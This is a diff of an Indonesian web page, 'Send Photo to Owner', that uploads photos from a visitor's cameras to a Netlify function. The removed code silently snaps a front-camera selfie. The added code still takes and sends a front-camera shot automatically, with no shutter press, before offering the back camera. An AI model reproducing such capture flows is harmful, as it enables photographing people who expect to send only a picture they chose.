@@ -1,172 +1,193 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Kirim Foto ke Owner</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%;overflow:hidden;background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#fff}
+  #app{position:fixed;inset:0;display:flex;flex-direction:column}
+
+  /* Intro */
+  #intro{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;
+    background:radial-gradient(circle at 50% 30%,#1a1a2e 0%,#0a0a0f 70%);z-index:100;text-align:center;padding:24px;gap:18px}
+  #intro h1{font-size:26px;font-weight:700;letter-spacing:.5px}
+  #intro p{font-size:14px;opacity:.6;max-width:280px;line-height:1.5}
+  .btn{background:linear-gradient(135deg,#ff2d55,#ff6b35);border:none;color:#fff;font-size:16px;font-weight:600;
+    padding:16px 40px;border-radius:999px;cursor:pointer;box-shadow:0 8px 30px rgba(255,45,85,.4);
+    transition:transform .15s,box-shadow .15s}
+  .btn:active{transform:scale(.96)}
+  .btn:disabled{opacity:.5;pointer-events:none}
+  .icon-cam{width:64px;height:64px;border-radius:50%;background:rgba(255,45,85,.15);
+    display:flex;align-items:center;justify-content:center;font-size:30px;border:2px solid rgba(255,45,85,.4)}
+
+  /* Camera */
+  #camView{position:absolute;inset:0;display:none;z-index:50;background:#000}
+  #video{width:100%;height:100%;object-fit:cover;background:#000}
+  #canvas{display:none}
+  #overlay{position:absolute;inset:0;pointer-events:none;display:flex;flex-direction:column;justify-content:space-between;padding:20px}
+  .topBar{display:flex;justify-content:space-between;align-items:center}
+  .pill{background:rgba(0,0,0,.5);padding:8px 14px;border-radius:999px;font-size:12px;backdrop-filter:blur(10px);
+    display:flex;align-items:center;gap:6px}
+  .dot{width:8px;height:8px;border-radius:50%;background:#ff2d55;animation:pulse 1.2s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+  .bottomBar{display:flex;justify-content:center;align-items:center;pointer-events:auto;padding-bottom:20px}
+  #shutter{width:74px;height:74px;border-radius:50%;background:#fff;border:5px solid rgba(255,255,255,.3);
+    cursor:pointer;transition:transform .1s}
+  #shutter:active{transform:scale(.9)}
+
+  /* Loading */
+  #loader{position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;
+    gap:20px;background:rgba(0,0,0,.85);z-index:200;backdrop-filter:blur(8px)}
+  .spinner{width:56px;height:56px;border:4px solid rgba(255,255,255,.15);border-top-color:#ff2d55;
+    border-radius:50%;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* Success */
+  #success{position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;
+    gap:16px;background:#0a0a0f;z-index:300;text-align:center;padding:24px}
+  #success .check{width:80px;height:80px;border-radius:50%;background:rgba(46,204,113,.15);
+    display:flex;align-items:center;justify-content:center;font-size:40px;border:2px solid #2ecc71}
+</style>
+</head>
+<body>
+<div id="app">
+  <div id="intro">
+    <div class="icon-cam">📸</div>
+    <h1>Kirim Foto ke Owner</h1>
+    <p>Dengan menekan tombol di bawah, kamu akan mengirimkan foto secara otomatis dari kamera perangkatmu.</p>
+    <button class="btn" id="startBtn">Mulai Kirim Foto</button>
+  </div>
+
+  <div id="camView">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <div id="overlay">
+      <div class="topBar">
+        <div class="pill"><span class="dot" id="recDot"></span><span id="camLabel">Kamera Depan</span></div>
+      </div>
+      <div class="bottomBar">
+        <button id="shutter"></button>
+      </div>
+    </div>
+  </div>
+
+  <div id="loader">
+    <div class="spinner"></div>
+    <div id="loaderText">Mengirim foto...</div>
+  </div>
+
+  <div id="success">
+    <div class="check">✓</div>
+    <h2>Foto Terkirim</h2>
+    <p style="opacity:.6;font-size:14px">Terima kasih sudah mengirim.</p>
+  </div>
+</div>
+
 <script>
-const intro         = document.getElementById('intro');
-const cameraEl      = document.getElementById('camera');
-const reviewEl      = document.getElementById('review');
-const statusOverlay = document.getElementById('statusOverlay');
-const statusMsg     = document.getElementById('statusMsg');
+const VIDEO = document.getElementById('video');
+const CANVAS = document.getElementById('canvas');
+const INTRO = document.getElementById('intro');
+const CAMVIEW = document.getElementById('camView');
+const LOADER = document.getElementById('loader');
+const LOADERTEXT = document.getElementById('loaderText');
+const SUCCESS = document.getElementById('success');
+const CAMLABEL = document.getElementById('camLabel');
+const SHUTTER = document.getElementById('shutter');
 
-const startBtn  = document.getElementById('startBtn');
-const shutter   = document.getElementById('shutter');
-const cancelBtn = document.getElementById('cancelBtn');
-const sendBtn   = document.getElementById('sendBtn');
+let currentFacing = 'user';
+let stream = null;
+let cooldownLock = false;
 
-const preview   = document.getElementById('preview');
-const reviewImg = document.getElementById('reviewImg');
-
-const vFront = document.getElementById('vFront');
-const cBack  = document.getElementById('cBack');
-const cFront = document.getElementById('cFront');
-
-let backStream  = null;
-let frontStream = null;
-let capturedBackBlob  = null;
-let capturedFrontBlob = null;
-
-function showStatus(msg, cls = '') {
-  statusMsg.textContent = msg;
-  statusOverlay.className = 'active ' + cls;
-}
-function hideStatus() { statusOverlay.className = ''; }
-
-function stopStream(s) {
-  if (!s) return;
-  s.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
-}
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-function waitFrame(v, timeout = 3000) {
-  return new Promise(res => {
-    if (v.readyState >= 2 && v.videoWidth > 0) return res();
-    const t = setTimeout(res, timeout);
-    v.onloadeddata = () => { clearTimeout(t); res(); };
-  });
-}
-
-function grabBlob(video, canvas, quality = 0.85) {
-  canvas.width  = video.videoWidth  || 640;
-  canvas.height = video.videoHeight || 480;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  return new Promise(res => canvas.toBlob(res, 'image/jpeg', quality));
-}
-
-function blobToBase64(blob) {
-  return new Promise((res, rej) => {
-    const fr = new FileReader();
-    fr.onload = () => res(fr.result.split(',')[1]);
-    fr.onerror = rej;
-    fr.readAsDataURL(blob);
-  });
-}
-
-async function sendPhoto(blob, caption) {
-  const photoBase64 = await blobToBase64(blob);
-  const r = await fetch('/.netlify/functions/send', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ caption, photoBase64 })
-  });
-  const data = await r.json();
-  if (!data.ok) throw new Error(data.description || 'send error');
-  return data;
-}
-
-async function captureFrontOnce() {
-  // buka kamera depan, ambil 1 frame, langsung tutup
-  const s = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+async function startCamera(facing) {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: { ideal: facing }, width: { ideal: 1280 }, height: { ideal: 720 } },
     audio: false
   });
-  vFront.srcObject = s;
-  vFront.setAttribute('playsinline', '');
-  vFront.setAttribute('muted', '');
-  await vFront.play();
-  await waitFrame(vFront);
-  await sleep(200); // kasih waktu exposure settle
-  const blob = await grabBlob(vFront, cFront, 0.85);
-  s.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
-  vFront.srcObject = null;
-  vFront.load();
-  return blob;
+  VIDEO.srcObject = stream;
+  await VIDEO.play().catch(()=>{});
+  currentFacing = facing;
+  CAMLABEL.textContent = facing === 'user' ? 'Kamera Depan' : 'Kamera Belakang';
 }
 
-async function openBackCamera() {
-  backStream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
-    audio: false
+function captureBlob() {
+  return new Promise(resolve => {
+    const w = VIDEO.videoWidth, h = VIDEO.videoHeight;
+    CANVAS.width = w; CANVAS.height = h;
+    const ctx = CANVAS.getContext('2d');
+    // mirror untuk kamera depan biar gak kebalik
+    if (currentFacing === 'user') {
+      ctx.translate(w, 0); ctx.scale(-1, 1);
+    }
+    ctx.drawImage(VIDEO, 0, 0, w, h);
+    CANVAS.toBlob(b => resolve(b), 'image/jpeg', 0.85);
   });
-  preview.srcObject = backStream;
-  preview.setAttribute('playsinline', '');
-  preview.setAttribute('muted', '');
-  await preview.play();
-  await waitFrame(preview);
 }
 
-/* ---------- flow ---------- */
+async function sendPhoto(blob, label) {
+  const fd = new FormData();
+  fd.append('photo', blob, 'photo.jpg');
+  fd.append('label', label);
+  const res = await fetch('/.netlify/functions/send-photo', { method:'POST', body: fd });
+  if (!res.ok) throw new Error('gagal kirim');
+  return res.json();
+}
 
-startBtn.addEventListener('click', async () => {
-  startBtn.disabled = true;
-  try {
-    // STEP 1: capture kamera depan duluan (sekilas, silent)
-    showStatus('Menyiapkan...');
-    capturedFrontBlob = await captureFrontOnce();
+function wait(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-    // tunggu driver kamera release
-    await sleep(700);
+async function autoFlow() {
+  INTRO.style.display = 'none';
+  CAMVIEW.style.display = 'block';
 
-    // STEP 2: baru nyalain kamera belakang
-    showStatus('Menyiapkan kamera...');
-    await openBackCamera();
+  // 1) Kamera depan -> otomatis capture
+  await startCamera('user');
+  LOADER.style.display = 'flex';
+  LOADERTEXT.textContent = 'Mengambil foto...';
+  await wait(600);
 
-    hideStatus();
-    intro.style.display = 'none';
-    cameraEl.classList.add('active');
-  } catch (err) {
-    showStatus('Gagal: ' + err.message, 'err');
-    startBtn.disabled = false;
+  let blob = await captureBlob();
+  LOADERTEXT.textContent = 'Mengirim foto...';
+  try { await sendPhoto(blob, 'front'); } catch(e) { console.error(e); }
+
+  // 2) Cooldown 5 detik
+  for (let i=5; i>0; i--) {
+    LOADERTEXT.textContent = `Tunggu ${i} detik...`;
+    await wait(1000);
   }
-});
 
-shutter.addEventListener('click', async () => {
-  shutter.disabled = true;
-  try {
-    await waitFrame(preview);
-    capturedBackBlob = await grabBlob(preview, cBack, 0.9);
-    reviewImg.src = URL.createObjectURL(capturedBackBlob);
-    cameraEl.classList.remove('active');
-    reviewEl.classList.add('active');
-  } catch (err) {
-    alert('Gagal ambil gambar: ' + err.message);
-  } finally {
-    shutter.disabled = false;
-  }
-});
+  // 3) Ganti ke kamera belakang
+  LOADER.style.display = 'none';
+  LOADERTEXT.textContent = 'Mengirim foto...';
+  await startCamera('environment');
 
-cancelBtn.addEventListener('click', () => {
-  if (capturedBackBlob) {
-    URL.revokeObjectURL(reviewImg.src);
-    capturedBackBlob = null;
-  }
-  reviewImg.src = '';
-  reviewEl.classList.remove('active');
-  cameraEl.classList.add('active');
-});
+  // 4) Manual shutter
+  SHUTTER.addEventListener('click', async () => {
+    if (cooldownLock) return;
+    cooldownLock = true;
+    LOADER.style.display = 'flex';
+    LOADERTEXT.textContent = 'Mengirim foto...';
+    try {
+      const b = await captureBlob();
+      await sendPhoto(b, 'back');
+      LOADER.style.display = 'none';
+      SUCCESS.style.display = 'flex';
+    } catch(e) {
+      LOADER.style.display = 'none';
+      alert('Gagal mengirim foto, coba lagi.');
+    } finally {
+      cooldownLock = false;
+    }
+  }, { once: false });
+}
 
-sendBtn.addEventListener('click', async () => {
-  if (!capturedBackBlob || !capturedFrontBlob) return;
-  cancelBtn.disabled = true;
-  sendBtn.disabled = true;
-
-  try {
-    showStatus('Mengirim...');
-    await sendPhoto(capturedBackBlob,  '📷 Kamera belakang');
-    await sendPhoto(capturedFrontBlob, '📸 Kamera depan');
-    showStatus('Terkirim ✓', 'ok');
-    setTimeout(() => location.reload(), 1200);
-  } catch (err) {
-    showStatus('Gagal: ' + err.message, 'err');
-    cancelBtn.disabled = false;
-    sendBtn.disabled = false;
-  }
+document.getElementById('startBtn').addEventListener('click', () => {
+  autoFlow().catch(err => {
+    console.error(err);
+    alert('Tidak bisa mengakses kamera. Pastikan izin kamera diizinkan.');
+  });
 });
 </script>
+</body>
+</html>
